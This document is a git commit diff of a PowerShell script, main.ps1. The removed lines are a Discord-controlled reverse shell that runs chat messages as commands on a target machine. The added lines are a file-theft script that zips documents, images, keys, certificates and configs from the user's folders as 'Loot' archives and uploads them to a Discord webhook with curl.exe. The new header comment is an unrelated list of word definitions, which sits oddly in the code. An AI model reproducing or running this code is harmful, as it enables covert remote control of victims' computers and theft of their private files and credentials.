ea72bcebef251f73480ea4f501ebcbb30a3b3cd5
Yazan  Al Nirab <110499472+yzhn92@users.noreply.github.com>
2025-06-30 06:02:23 +0300

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,40 +1,40 @@
+<# ============================================ EXFIL to DISCORD =================================================
 
-<# ============================================= Beigeworm's Discord Reverse Shell ========================================================
+Ablaze – On fire; brightly burning with intensity.
 
-**SYNOPSIS**
-Using a Discord bot along with discords API to Act as a Powershell Terminal.
+Banter – Playful, teasing talk between close friends.
 
-INFORMATION
-This script uses a discord bot along with discords API to control a windows pc via powershell.
-Every 10 seconds it will check for a new message in chat and interpret it as a Powershell command.
+Crisp – Firm, dry, and easily breakable texture.
 
-SETUP
-1. make a discord bot at https://discord.com/developers/applications/
-2. add the bot to your discord server (with intents enabled and messaging and file upload permissions)
-4. Change $tk below with your bot token
-5. Change $ch below to the channel id of your webhook.
+Dapper – Stylish, neat man with elegant appearance.
 
-USAGE
-1. Setup the script
-2. Run the script on a target.
-3. Check discord for 'waiting to connect..' message.
-4. Enter the computername to authenticate the session.
-5. Enter commands to interact with the target.
+Elicit – Draw out a response or reaction.
+
+Fathom – Understand something deeply, often abstractly.
+
+Glimpse – Quick, brief look without full details.
+
+Havoc – Widespread destruction; total chaos and disorder.
+
+Imbue – Fill or inspire with certain feelings.
+
+Jovial – Cheerful, friendly, full of good humor.
+
+Keen – Sharp, eager, or intellectually perceptive mind.
+
+Lurk – Remain hidden, waiting to spring forth.
+
+Mirth – Amusement expressed through laughter or cheerfulness.
+
+Nimble – Quick and light in movement or action.
 
 #>
 
+$hookurl = "$dc"
+if ($hookurl.Length -lt 120){
+	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
-# ================================================================ Discord C2 ======================================================================
-
-$token = "$tk" # make sure your bot is in the same server as the webhook
-$chan = "$ch" # make sure the bot AND webhook can access this channel
-
-# =============================================================== SCRIPT SETUP =========================================================================
-
-$response = $null
-$previouscmd = $null
-$authenticated = 0
-$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 
 # Uncomment $hide='y' below to hide the console
 
@@ -54,116 +54,54 @@ if($hide -eq 'y'){
 }
 
 
-function PullMsg {
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", $headers.Authorization)
-    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
-    
-    if ($response) {
-        $most_recent_message = ($response | ConvertFrom-Json)[0]
-        if (-not $most_recent_message.author.bot) {
-            $response = $most_recent_message.content
-            $script:response = $response
-            $script:messages = $response
-        }
-    } else {
-        Write-Output "No messages found in the channel."
-    }
+Function FindAndSend {
+
+param ([string[]]$FileType,[string[]]$Path)
+$maxZipFileSize = 10MB
+$currentZipSize = 0
+$index = 1
+$zipFilePath ="$env:temp/Loot$index.zip"
+
+If($Path -ne $null){
+$foldersToSearch = "$env:USERPROFILE\"+$Path
+}else{
+$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
 }
 
-
-function sendMsg {
-    param([string]$Message)
-    $dir = $PWD.Path
-    $url = "https://discord.com/api/v9/channels/$chan/messages"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", "Bot $token")
-    if ($Message) {
-            $jsonBody = @{
-                "content" = "$Message"
-                "username" = "$dir"
-            } | ConvertTo-Json
-            $webClient.Headers.Add("Content-Type", "application/json")
-            $response = $webClient.UploadString($url, "POST", $jsonBody)
-            Write-Host "Message sent to Discord"
-        }
-    }
-
-Function Authenticate{
-    if ($response -like "$env:COMPUTERNAME"){
-        $script:authenticated = 1
-        $script:previouscmd = $response
-        sendMsg -Message ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
-        sendMsg -Message "``PS | $dir>``"
-    }
-    else{
-        $script:authenticated = 0
-        $script:previouscmd = $response
-    } 
+If($FileType -ne $null){
+$fileExtensions = "*."+$FileType
+}else {
+$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
 }
 
-# =============================================================== MAIN LOOP =========================================================================
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
 
-PullMsg
-$previouscmd = $response
-sendMsg -Message ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
-
-while ($true) {
-    PullMsg
-    if (!($response -like "$previouscmd")) {
-        $dir = $PWD.Path
-        Write-Output "Command found!"
-        if ($authenticated -eq 1) {
-            if ($response -like "close") {
-                $previouscmd = $response        
-                sendMsg -Message ":octagonal_sign:  **$env:COMPUTERNAME** | ``Session Closed.``  :octagonal_sign:"
-                break
+foreach ($folder in $foldersToSearch) {
+    foreach ($extension in $fileExtensions) {
+        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
+        foreach ($file in $files) {
+            $fileSize = $file.Length
+            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
+                $zipArchive.Dispose()
+                $currentZipSize = 0
+                curl.exe -F file1=@"$zipFilePath" $hookurl
+                Remove-Item -Path $zipFilePath -Force
+                Sleep 1
+                $index++
+                $zipFilePath ="$env:temp/Loot$index.zip"
+                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
             }
-            if ($response -like "Pause") {
-                $script:authenticated = 0
-                $previouscmd = $response
-                sendMsg -Message ":pause_button:  **$env:COMPUTERNAME** | ``Session Paused..``  :pause_button:"
-                sleep -m 250
-                sendMsg -Message ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
-            }
-            elseif (!($response -like "$previouscmd")) {
-                $Result = ie`x($response) -ErrorAction Stop
-                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")) {
-                    $script:previouscmd = $response
-                    sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
-                    sleep -m 250
-                    sendMsg -Message "``PS | $dir>``"
-                }
-                else {
-                    $script:previouscmd = $response
-                    $resultLines = $Result -split "`n"
-                    $maxBatchSize = 1900
-                    $currentBatchSize = 0
-                    $batch = @()
-                    foreach ($line in $resultLines) {
-                        $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
-                        if (($currentBatchSize + $lineSize) -gt $maxBatchSize) {
-                            sendMsg -Message "``````$($batch -join "`n")``````"
-                            sleep -m 400
-                            $currentBatchSize = 0
-                            $batch = @()
-                        }
-                        $batch += $line
-                        $currentBatchSize += $lineSize
-                    }
-                    if ($batch.Count -gt 0) {
-                        sendMsg -Message "``````$($batch -join "`n")``````"
-                        sleep -m 250
-                    }
-                    sendMsg -Message "``PS | $dir>``"
-                }
-            }
-        } else {
-            Authenticate
+            $entryName = $file.FullName.Substring($folder.Length + 1)
+            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
+            $currentZipSize += $fileSize
         }
     }
-    sleep 5
 }
+$zipArchive.Dispose()
+curl.exe -F file1=@"$zipFilePath" $hookurl
+Remove-Item -Path $zipFilePath -Force
+Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
+}
+
+FindAndSend 
